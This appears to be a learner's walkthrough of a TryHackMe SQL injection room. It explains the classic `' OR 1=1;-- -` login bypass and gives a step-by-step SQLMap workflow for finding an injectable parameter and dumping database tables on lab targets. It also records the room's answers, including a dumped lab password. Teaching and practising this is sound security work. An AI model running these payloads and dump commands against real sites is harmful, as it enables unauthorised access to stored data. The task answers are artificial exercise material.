# SQLMap: The Basics

> TryHackMe | Cyber Security 101  
> Room: [SQLMap: The Basics](https://tryhackme.com/room/sqlmapthebasics)  
> Difficulty: Easy | Tags: SQL Injection, SQLMap, Web Security, Database

---

## 📌 Overview

SQL injection is one of the most prevalent and damaging vulnerabilities in web
security. This room teaches how websites interact with databases via SQL
queries, how attackers exploit improper input validation to manipulate those
queries, and how to use SQLMap — an automated tool — to discover and exploit
SQL injection vulnerabilities.

**Topics covered:**
- How websites interact with databases using SQL
- What SQL injection is and how it works mechanically
- Manual SQL injection logic (boolean bypass)
- SQLMap — automated SQL injection testing
- Practical exploitation: extract databases, tables, and records
- GET-based vs POST-based testing with SQLMap

---

## 🧠 Task 1 — Introduction

### How Websites Interact with Databases

Every time you log in, search, or submit a form on a website, the website
sends an SQL query to a database and acts on the result.

```
User input (browser)
       ↓
Web application (PHP/Python/Node...)
       ↓  SQL query
DBMS (MySQL, PostgreSQL, SQLite, MSSQL...)
       ↓
Database (tables with rows and columns)
```

**DBMS examples:** MySQL, PostgreSQL, SQLite, Microsoft SQL Server.

**Example: login flow**

User enters: `username: John` / `password: Un@detectable444`

The website constructs and sends this query:
```sql
SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
```

The database checks both conditions. If both match → return user record →
login succeeds.

**Task answer:**
- Language that builds the interaction between a website and its database → **SQL**

---

## 💉 Task 2 — SQL Injection Vulnerability

### What is SQL Injection?

SQL injection happens when **user input is not properly validated or
sanitized**, allowing an attacker to inject SQL code into a query and change
its behavior.

> 💡 **Sanitization** = validating and cleaning user input before using it
> in a query. Without it, whatever the user types goes directly into the SQL
> statement — including SQL syntax.

---

### How It Works — The Classic Login Bypass

**Normal query (legitimate user):**
```sql
SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
```
Both conditions must be true (AND) → database finds the user → login granted.

---

**Injected query (attacker):**

Attacker enters:
- Username: `John`
- Password: `abc' OR 1=1;-- -`

The website constructs:
```sql
SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
```

Breaking down what happened:

| Part | Effect |
|------|--------|
| `'abc'` | The single quote closes the password string — `abc` is treated as the password value |
| `OR 1=1` | Adds a condition that is **always true** — overrides the failed password check |
| `;-- -` | Semicolon ends the statement; `-- -` comments out everything after, preventing syntax errors |

**Why the single quote matters:**
Without `'` after abc, the entire string `abc OR 1=1;-- -` would be treated
as the password value — the injection wouldn't work. The quote is what
breaks out of the string context and allows the SQL logic to be injected.

**Evaluation logic:**
```
username = 'John' → TRUE
AND password = 'abc' → FALSE
OR 1=1 → TRUE

Result: FALSE AND ... OR TRUE = TRUE → LOGIN GRANTED
```

The attacker bypasses authentication entirely without knowing the password.

> ⚠️ Only attempt SQL injection on applications you have explicit permission
> to test. Unauthorized testing is illegal.

**Task answers:**
- Boolean operator that checks if at least one side is true → **OR**
- Is `1=1` in an SQL query always true? → **YEA**

---

## 🤖 Task 3 — Automated SQL Injection with SQLMap

### What is SQLMap?

SQLMap is an open-source, automated tool for detecting and exploiting SQL
injection vulnerabilities. It handles the tedious work of crafting payloads,
testing injection types, and extracting data.

```bash
# Get help — lists all available flags
sqlmap --help

# Interactive wizard mode (guided setup for beginners)
sqlmap --wizard
```

---

### SQLMap Injection Types Detected

When SQLMap finds a vulnerability, it reports which injection techniques work:

| Type | How it works |
|------|-------------|
| **Boolean-based blind** | Modifies the query with a boolean expression (e.g. `AND 1=1`) — infers data from true/false responses |
| **Error-based** | Intentionally generates database errors that contain data in the error message |
| **Time-based blind** | Uses `SLEEP()` — if the response delays, the condition is true |
| **UNION query** | Appends a `UNION SELECT` to retrieve data from other tables directly |

---

### Core SQLMap Flags

| Flag | Purpose | Example |
|------|---------|---------|
| `-u` | Target URL | `-u "http://target.thm/search?cat=1"` |
| `--dbs` | Extract all database names | `sqlmap -u URL --dbs` |
| `-D` | Specify a database | `-D users` |
| `--tables` | List tables in the specified database | `-D users --tables` |
| `-T` | Specify a table | `-T thomas` |
| `--dump` | Extract/dump all records from the specified table | `-D users -T thomas --dump` |
| `-r` | Use an intercepted request file (for POST testing) | `-r intercepted_request.txt` |
| `--cookie` | Include session cookie for authenticated testing | `--cookie="PHPSESSID=abc123"` |
| `--level` | Depth of testing (1-5, default 1) | `--level=5` |
| `--wizard` | Interactive guided mode | `sqlmap --wizard` |

---

### Full Exploitation Workflow (GET-based)

Using a vulnerable URL `http://sqlmaptesting.thm/search/cat=1`:

#### Step 1 — Detect the vulnerability

```bash
sqlmap -u 'http://sqlmaptesting.thm/search/cat=1'
```

SQLMap tests the `cat` parameter and reports which injection types work.

Sample output:
```
[INFO] GET parameter 'cat' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
[INFO] GET parameter 'cat' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
[INFO] the back-end DBMS is MySQL
```

#### Step 2 — Extract all databases

```bash
sqlmap -u 'http://sqlmaptesting.thm/search/cat=1' --dbs
```

Sample output:
```
available databases [2]:
[*] users
[*] members
```

#### Step 3 — List tables in a specific database

```bash
sqlmap -u 'http://sqlmaptesting.thm/search/cat=1' -D users --tables
```

Sample output:
```
Database: users
[3 tables]
+-----------+
| johnath   |
| alexas    |
| thomas    |
+-----------+
```

#### Step 4 — Dump records from a table

```bash
sqlmap -u 'http://sqlmaptesting.thm/search/cat=1' -D users -T thomas --dump
```

Sample output:
```
Database: users
Table: thomas
[1 entry]
+------------+------------+---------+
| Date       | name       | pass    |
+------------+------------+---------+
| 09/09/2024 | Thomas THM | testing |
+------------+------------+---------+
```

> 💡 SQLMap caches results between runs. If you re-run the same URL,
> it will say "resuming from stored session" and skip re-testing the
> injection point — making subsequent commands faster.

---

### POST-based Testing

Some applications send form data in the request body (login forms,
registration forms) instead of URL parameters. For these, capture the
request with a tool like Burp Suite and save it to a file:

```bash
sqlmap -r intercepted_request.txt
```

SQLMap reads the saved request and tests injection points in the body.

---

### Cookie-based Testing (Authenticated Scans)

When a vulnerable endpoint requires authentication, provide the session
cookie so SQLMap interacts as a logged-in user:

```bash
sqlmap -u 'http://target.thm/page' --cookie="PHPSESSID=abcdef123456"
```

---

**Task answers:**
- Flag to extract all databases → **`--dbs`**
- Full command to extract all tables from the `members` database:
  **`sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D members --tables`**

---

## 🎯 Task 4 — Practical Challenge

### Lab Setup

- Target: `http://MACHINE_IP/ai/login` — login page vulnerable to SQL injection
- Use the AttackBox for all commands

### Finding the URL with GET Parameters

The login page uses GET requests, but the parameters are not visible in the
URL bar. To get the full URL with parameters:

1. Right-click the login page → **Inspect**
2. Go to the **Network** tab
3. Enter test credentials (e.g. `email=test` / `password=test`) → click Login
4. Find the GET request in the Network tab → copy the full URL

Full URL with parameters:
```
http://MACHINE_IP/ai/includes/user_login?email=test&password=test
```

> ⚠️ Always wrap the URL in **single quotes** in the terminal. URLs with
> `?` and `&` contain characters that the shell interprets as special
> characters — quotes prevent this.

---

### SQLMap Interactive Prompts — How to Respond

When running commands below, SQLMap will ask several questions. Answer as
follows to keep the scan running smoothly:

| Prompt | Answer |
|--------|--------|
| Back-end DBMS is MySQL. Skip tests for other DBMSes? | `y` |
| Include all tests for MySQL extending provided risk value? | `y` |
| Injection not exploitable with NULL values. Try random integer? | `y` |
| GET parameter 'email' is vulnerable. Keep testing others? | `n` |

---

### Step 1 — Detect Vulnerability and List All Databases

```bash
sqlmap -u 'http://MACHINE_IP/ai/includes/user_login?email=test&password=test' \
  --dbs --level=5
```

> 💡 `--level=5` performs deeper, more thorough injection testing. The
> simple scan may not find anything on this target — the higher level is
> required because the injection point needs more complex payloads to confirm.

Answer `y` to all prompts and wait.

**Result:** 6 databases found

**Task answer:** Number of databases → **6**

---

### Step 2 — List Tables in the `ai` Database

```bash
sqlmap -u 'http://MACHINE_IP/ai/includes/user_login?email=test&password=test' \
  -D ai --tables --level=5
```

Answer `y` to prompts as before.

**Result:** 1 table — `user`

**Task answer:** Table in the `ai` database → **user**

---

### Step 3 — Dump Records from the `user` Table

```bash
sqlmap -u 'http://MACHINE_IP/ai/includes/user_login?email=test&password=test' \
  -D ai -T user --dump --level=5
```

**Result:**

```
Database: ai
Table: user
+------------------+----------+
| email            | password |
+------------------+----------+
| test@chatai.com  | 12345678 |
| ...              | ...      |
+------------------+----------+
```

**Task answer:** Password of `test@chatai.com` → **12345678**

---

## 🔍 Thinking Through the Room — Full Attack Flow

```
1. UNDERSTAND THE TARGET
   Website with login form → uses SQL queries → potential injection point

2. FIND THE INJECTABLE URL
   GET params in URL → copy directly
   POST form / hidden params → inspect Network tab → copy full URL

3. TEST FOR VULNERABILITY
   sqlmap -u 'URL' --level=5
   → SQLMap identifies injectable parameters and injection types

4. ENUMERATE DATABASES
   sqlmap -u 'URL' --dbs --level=5
   → lists all database names

5. ENUMERATE TABLES
   sqlmap -u 'URL' -D <database> --tables --level=5
   → lists all tables in chosen database

6. DUMP DATA
   sqlmap -u 'URL' -D <database> -T <table> --dump --level=5
   → extracts all records from the table
```

---

## 💡 Insights & Things to Remember

**The single quote is the injection entry point:**
The `'` breaks out of the string context in the SQL query. Without it, the
attacker's input is just a string value. With it, SQL syntax can be injected.
This is why input sanitization (escaping quotes, using prepared statements)
is the correct defense.

**`OR 1=1` works because SQL evaluates left-to-right with operator precedence:**
`AND` has higher precedence than `OR`, so the query `password = 'abc' OR 1=1`
evaluates the `OR` after the failed `AND` check, and `1=1` is always true.
Understanding this explains why the payload works even with a wrong password.

**`--level=5` is not always needed — but know when to use it:**
Default level 1 covers most common injection points. Level 5 tests more
injection points, more HTTP parameters (headers, cookies, user-agent), and
uses more complex payloads. Use it when the simple scan finds nothing on
a target you know is vulnerable.

**SQLMap caches sessions — restart cleanly when needed:**
If a previous scan cached incorrect results, add `--flush-session` to force
a fresh start. Otherwise, SQLMap will reuse old results even if the target
changed.

**POST testing requires request capture — Burp Suite is the standard tool:**
For POST-based injection (login forms), you need to intercept the actual
HTTP request. Burp Suite's Proxy tab makes this straightforward. Save the
raw request to a file, then use `sqlmap -r request.txt`.

---

## ⚖️ Reflection

**What clicked:**
- The mechanical explanation of `' OR 1=1;-- -` — seeing exactly why each
  character matters (the quote closes the string, OR adds a new condition,
  1=1 is always true, `-- -` comments out the rest) makes SQL injection
  concrete rather than abstract
- SQLMap's workflow (test → `--dbs` → `-D --tables` → `-D -T --dump`) is
  a clean, repeatable methodology that maps directly to manual SQL injection
  steps
- The difference between GET params visible in the URL vs. hidden GET
  params that require browser dev tools to extract — both are GET requests,
  but discovery method differs

**Still unclear:**
- How do **prepared statements** prevent SQL injection at the code level?
  This is the correct defense — worth understanding the mechanism, not just
  the practice
- What does `--level=5` actually test that level 1 doesn't? Headers?
  Cookies? User-Agent? Understanding this helps decide when to escalate
- How does SQLMap handle WAFs (Web Application Firewalls)? There are
  tamper scripts (`--tamper`) — worth exploring

**Next:**
- SQL Injection room on TryHackMe — manual exploitation without tools
- Burp Suite room — learn to intercept and capture POST requests for
  `-r` mode in SQLMap
- Study prepared statements / parameterized queries as the defense side

---

## 📚 Quick Reference — SQLMap Commands

```bash
# Basic detection
sqlmap -u 'http://target.thm/page?param=value'

# Deep scan
sqlmap -u 'http://target.thm/page?param=value' --level=5

# List all databases
sqlmap -u 'URL' --dbs

# List tables in a database
sqlmap -u 'URL' -D database_name --tables

# Dump all records from a table
sqlmap -u 'URL' -D database_name -T table_name --dump

# POST request from file
sqlmap -r intercepted_request.txt

# Authenticated scan with cookie
sqlmap -u 'URL' --cookie="SESSIONID=abcdef"

# Interactive wizard
sqlmap --wizard

# Flush cached session and restart
sqlmap -u 'URL' --flush-session
```

---

## 📚 References

- [TryHackMe - SQLMap: The Basics](https://tryhackme.com/room/sqlmapthebasics)
- [SQLMap Official Documentation](https://sqlmap.org/)
- [SQLMap GitHub Repository](https://github.com/sqlmapproject/sqlmap)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
